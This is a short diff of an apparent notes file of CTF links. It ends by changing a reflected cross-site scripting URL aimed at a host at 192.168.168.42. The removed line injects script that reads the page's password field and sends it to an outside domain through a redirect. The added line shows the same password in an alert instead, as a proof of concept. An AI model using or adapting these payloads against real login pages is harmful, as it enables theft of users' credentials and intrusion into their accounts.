@@ -94,4 +94,4 @@ https://blog.ctftools.com/2017/03/post122/
 https://github.com/facebook/fbctf/wiki/Installation-Guide,-Production
 
 
-http://192.168.168.42/?LanmanErrorCode=%3Cscript%3EsetTimeout(function(){window.location.href="http://zizhu.cug.edu.cn/"+document.getElementById(%22password%22).value;},1000);%3C/
+http://192.168.168.42/?LanmanErrorCode=%3Cscript%3EsetTimeout(function(){alert(document.getElementById(%22password%22).value);},1000);%3C/script%3E
